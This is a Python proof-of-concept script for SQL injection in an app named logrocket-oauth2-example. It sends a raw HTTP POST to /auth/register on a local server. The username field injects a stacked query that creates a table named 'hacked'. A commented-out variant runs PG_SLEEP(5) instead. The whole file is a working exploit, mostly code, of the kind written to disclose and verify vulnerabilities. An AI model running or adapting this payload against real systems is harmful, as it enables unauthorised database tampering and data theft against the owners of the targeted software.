#!/usr/bin/env python3
# PoC: SQL Injection in logrocket-oauth2-example
# under linux:      python3 ./poc_createtable.py
# under windows:    python.exe .\poc_createtable.py
import socket

target_ip = "127.0.0.1"
target_port = 3000

# handle large responses
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        if not part: # no more data
            break
        data += part
    return data

sqli_payload = "password=test3&username=test';CREATE TABLE hacked()--" # poc: create table "hacked"
#sqli_payload = "password=test3&username=test';SELECT PG_SLEEP(5)--"   # poc: sleep 5 seconds

req = "POST /auth/register HTTP/1.1\r\n"
req += f"Host: {target_ip}:{target_port}\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += f"Content-Length: {len(sqli_payload)}\r\n"
req += "Connection: close\r\n"
req += "\r\n"
req += sqli_payload
#print(req)
request = req.encode()

print("[#] Proof of Concept - SQL Injection in logrocket-oauth2-example")
print("[#] Target: {}:{}".format(target_ip, target_port))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    print("[*] Sending HTTP request...")
    s.send(request)
    response = recvall(s).decode()
    
    if "Something went wrong!" in response:
        print("[+] Received expected error response. Check if table was created in DB.")
        #print(response)

    else:
        print("[-] Unexpected response:")
        print(response)

except Exception as conres:
    print("[-] Socket died. Are you sure the target server is running and is reachable?")